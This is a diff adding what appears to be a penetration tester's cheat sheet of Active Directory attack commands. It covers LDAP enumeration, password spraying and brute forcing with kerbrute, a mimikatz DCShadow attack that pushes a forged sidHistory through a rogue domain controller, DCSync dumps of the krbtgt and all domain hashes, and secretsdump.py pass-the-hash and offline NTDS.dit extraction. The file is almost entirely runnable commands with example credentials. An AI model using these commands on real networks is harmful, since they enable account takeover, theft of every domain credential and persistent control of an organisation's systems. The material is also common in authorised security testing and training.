@@ -1,0 +1,49 @@
+# Basic ldap enumeration
+enum4linux -a 192.168.1.2
+python windapsearch.py -u morph3 -p morph3 -d evil.corp --dc-ip 192.168.1.2
+python ad-ldap-enum.py -d contoso.com -l 10.0.0.1 -u Administrator -p P@ssw0rd
+
+# Bruteforce on ldap
+
+## Password spray
+https://github.com/dafthack/DomainPasswordSpray
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
+
+## Password brute
+./kerbrute_linux_amd64 bruteuser -d evil.corp --dc 192.168.1.2 rockyou.txt morph3
+
+## Username brute
+./kerbrute_linux_amd64 userenum -d evil.corp --dc 192.168.1.2 users.txt
+
+## Password spray
+./kerbrute_linux_amd64 passwordspray -d evil.corp --dc 192.168.1.2 users.txt rockyou.txt
+
+# DCShadow
+DC Shadow attack aims to inject malicious Domain Controlllers into AD infrastructure so that we can dump actual AD members.
+
+## Find sid for that user
+wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid
+
+## This will create a RPC Server and listen
+lsadump::dcshadow /object:"CN=morph3,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local" /attribute:sidhistory /value:sid
+
+## Run this from another mimikatz
+lsadump::dcshadow /push
+;; After this unregistration must be done
+;; Relogin
+lsadump::dcsync /domain:ECORP.local /account:krbtgt
+
+## Now you must have krbtgt hash
+https://attack.stealthbits.com/how-dcshadow-persistence-attack-works
+
+
+# DC Sync
+lsadump::dcsync /domain:domain /all /csv
+lsadump::dcsync /user:krbtgt
+
+https://gist.github.com/monoxgas/9d238accd969550136db
+powershell.exe -c "Import-Module .\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat"
+
+python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
+python secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL
